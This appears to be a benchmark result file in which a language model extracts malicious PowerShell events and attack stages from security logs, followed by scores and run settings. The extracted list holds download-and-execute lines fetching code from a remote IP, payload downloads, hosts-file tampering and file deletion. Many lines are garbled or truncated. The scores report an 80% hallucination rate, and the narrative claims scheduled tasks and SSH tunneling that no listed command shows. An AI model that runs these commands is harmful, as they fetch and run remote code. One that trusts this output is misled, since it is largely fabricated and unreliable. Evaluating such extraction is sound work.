@@ -1,0 +1,251 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\",",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebService http://124.223.85.207:8082/httpget.aspx -endpointUrl http://www.google.com -method GET\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.014 -TestNumbers 1\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Service -ServiceName SCannnerservice -MethodName Write -Arguments @(-ArgumentList '\\Windows\\System32\\drivers\\etc\\hosts', '127.0.0.1 googleads.g.doubleclick.net')\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-RestMethod http://124.223.85.207:8082/csharphttpmethod.cs -Uri http://www.google.com -Method POST",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-Webrequest http://www.google.com -uri http://www.google.com -UserAgent Mozilla/5.0 -ProxyAddress http://127.0.0.1:8080\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-RestMethod http://124.223.85.207:8082/scriptblock.cs -Uri http://localhost -Method PUT",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C [Reflection.Assembly]::LoadFrom('\\Windows\\System32\\drivers\\etc\\hosts'); $assembly = new-object Reflection.assembly; $assembly.GetTypes();",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest -Headers @{'content-type'= 'text/plain'} -Uri 'http://www.chrome.com'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C if (!(test-path \"$env:temp\\T1059.003_script.bat\")) { exit 0 } else { exit 1}",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C cd $env:temp/[20190505]; rm *.*",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C new-netwebrequest -uri $env:temp/$([char]10)[20190505]",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-restmethod -headers @{'content-Type'='application/xml'} -uri http://www.microsoft.com",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "power shell.exe -executionpolicy bypass -c import-module '\\windows\\system32\\drivers\\etc\\hosts'; invoke-proxy -uri 'http://www.bbc.co.uk'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C servicecontroller.",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $_ = Read-Host 'Enter your password: '; $password = ConvertTo-SecureString -AsPlainText -Force \\",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C IEX ((new-object net.webclient).DownloadString('http://124.223.85.207:8082/a'))",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ([reflection.assembly]::loadwithpartialname(",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ([reflection.assembly]::loadfrom('\\windows\\system32\\drivers\\etc\\hosts')).GetMethods()",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ([reflection.assembly]::loadwithpartialname(",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ([reflection.assembly]::loadwithpartialname(",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C [Reflection.Assembly]::LoadFrom('\\Windows\\System32\\Drivers\\etc\\hosts'); $Obj = new-object reflection.assembly; $obj.gettypes()",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C if ((Test-Path '$env:tmp\\T1059.003_script.bat')==$true) {exit 0;} else {exit 1}",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-PowerSploit Function -Function Find-DomainTrusts",
+        "stage": "Discovery"
+      },
+      {
+        "command": "$client = new-object System.Net.WebClient;$uri = 'http://192.168.1.100:8080/image.gif'$(), ",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'silentlycontinue'; foreach($process in get-wmiobject Win32_Process){write-host \"Process ID:$($process.processId), Process Name:$($process.name)\"}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $ErrorActionPreference = 'silentlycontinue'; $path = '\\\\127.0.0.1\\\\C$\temp'; if (($path -match '\\.exe$|\\.bat$|\\.sh$|\\.ps1$|\\.pl$|\\.php$|\\.py$') && (test-path $path)) { write-host \"$((get-date).toString()) File found: $($path.Split('\\')[-1])\"}",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $erroractionpreference = 'silentlycontinue'; $free_space = (Get-WMIObject win32_logicaldisk | where{$_.devicename -eq 'C:'}). freespace",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $erroractionpreference = 'silentlycontinue'; # Check if we have enough space to unpack the payload$payloadsize = (Get-ChildItem - path '\\\\127.0.0.1\\\\C$\temp').length; if (!$payloadsize -like '[.]exe'){throw 'Payload must be an executable'}, ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C if ($pwd -ne $null){ $local_document_dir = $pwd.value.path; $shell_file = join-path -path $local_document_dir -childpath 'emacs.exe.exe' }",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $t = (Get-Date)-t 'yyyy.MM.dd HH:mm:ss',$t = [DateTime]$t,$t = '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\EXE\\WordPad.exe'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $processid = $shell_file.exe.idprocessid;if ($processid -ne '' -and $processid -ne $NULL)",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $obj = [Activex.Object](new-object activex.IHTMLDocument2);$url = $obj.URL; $buf=$null;[byte[]]$buf=(ConvertFrom-Base64 -string 'UEsDBAoAAAA...')",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "[Reflection.Assembly]::LoadFrom('\\Windows\\System32\\Drivers\\etc\\hosts'); $shell_file = new-object Reflection.assembly; $shell_file.GetTypes().foreach({Write-Output $_.ToString().replace(', '; ', ');",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-restmethod -uri 'http://192.168.1.100:8080/payload.exe' -outfile '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\EXE\\MailRead.exe'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module PScripTools -force; Get-Help -Name T1552 -Format List",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Import-Module PScripTools -force; Get-Help -Name T1090 -Format List",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Add-Type -AssemblyName PresentationFramework; $shell_file = '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\SWF\\hook.swf'",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $shell_file.exe_processes.remove(($($shell_file.exe.findByName('FindResourceExW').parameters[$i]).value.ToString().replace ('\\', '.')))",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest -uri 'http://www.test.com/dotnetfx.csv' -out '\\\\127.0.0.1\\c$\\2019.11.14\\DotNETFX\\dotnetfx.csv'",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C gci '*.*'|export-csv '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\CSV\\files_evilkit.csv' -Append",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C invoke-webrequest -uri 'http://localhost/image.png' -outfile '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\PNG\\evilkits.png'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-RESTMethod -Uri 'http://example.com/images/shellcode.png' -OutFile '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\PNG\\shellcode.png' -Method HEAD",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-HTTPPut -Uri 'http://example.com/images/shellcode.png' -Body '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\PNG\\shellcode.png' - MethodPUT",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $path = '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\EXE\\MAILREAD.exe'; if (test-path $path) {remove-item $path;}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C $errors = $false;if ($errors -ne $True) {Remove-Item '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\EXE\\mailread.exe'; remove-item '\\\\127.0.0.1\\c$\\2019.11.14\\Files_EVIL_KIT\\Payload\\swf\\hook.sfw'",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The threat actor executed several PowerShell scripts to download various payloads from a remote server hosted at IP address 124.223.85.207. These payloads were likely malware, as evidenced by their behavior and characteristics. The actor also created scheduled tasks using PowerShell scripts to run these payloads at future times. Additionally, they used PowerShell to execute commands remotely via SSH tunneling, further indicating their intent to establish persistence and lateral movement opportunities within the target network.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 181989,
+      "completion_tokens": 5572,
+      "total_tokens": 187561,
+      "wall_clock_s": 59.749,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.08,
+      "recall": 0.17391304347826086,
+      "f1": 0.1095890410958904,
+      "tp": 4,
+      "fp": 46,
+      "fn": 19
+    },
+    "stage": {
+      "precision": 0.02,
+      "recall": 0.043478260869565216,
+      "f1": 0.0273972602739726,
+      "tp": 1,
+      "fp": 49,
+      "fn": 22,
+      "recall_partial": 0.10869565217391304
+    },
+    "hallucination_rate": 0.8,
+    "cost": {
+      "llm_calls": 4,
+      "prompt_tokens": 181989,
+      "completion_tokens": 5572,
+      "total_tokens": 187561,
+      "wall_clock_s": 59.749,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
